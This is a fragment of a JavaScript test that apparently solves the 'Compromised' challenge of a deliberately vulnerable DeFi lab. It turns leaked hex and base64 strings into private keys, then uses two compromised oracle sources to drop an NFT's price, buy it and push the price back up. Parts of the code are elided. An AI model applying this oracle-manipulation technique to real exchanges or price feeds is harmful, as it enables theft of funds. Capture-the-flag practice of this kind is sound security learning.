...
describe('Compromised challenge', function () {
    ...
    it('Execution', async function () {
        ...
        privateKey1 = Buffer.from(leak1.split(" ").join(""), "hex").toString("utf8");
        privateKey1 = Buffer.from(privateKey1, "base64").toString("utf8");
        ...
        await oracle.connect(source2).postPrice('DVNFT', price);

        await exchange.connect(player).buyOne({ value: price });

        await oracle.connect(source1).postPrice('DVNFT', INITIAL_NFT_PRICE + price);
        await oracle.connect(source2).postPrice('DVNFT', INITIAL_NFT_PRICE + price);
